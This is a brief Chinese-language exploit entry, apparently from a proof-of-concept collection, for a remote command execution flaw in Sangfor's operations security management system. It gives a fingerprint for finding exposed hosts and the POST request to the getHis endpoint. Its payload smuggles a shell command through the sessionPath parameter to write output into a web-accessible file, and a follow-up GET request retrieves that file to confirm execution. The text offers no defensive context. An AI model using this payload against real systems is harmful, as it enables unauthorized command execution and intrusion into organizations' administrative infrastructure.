# 深信服运维安全管理系统getHis远程代码执行漏洞

深信服 ｜ 命令执行 ｜ —
- **指纹**：`body="/fort/login"`
- **请求**：`POST /isomp-protocol/protocol/getHis HTTP/1.1`

**Payload**
```
sessionPath=;id>/usr/local/tomcat/webapps/isomp-protocol/okm.txt;&sid=1
GET /isomp-protocol/okm.txt HTTP/1.1
```
- **响应特征**：200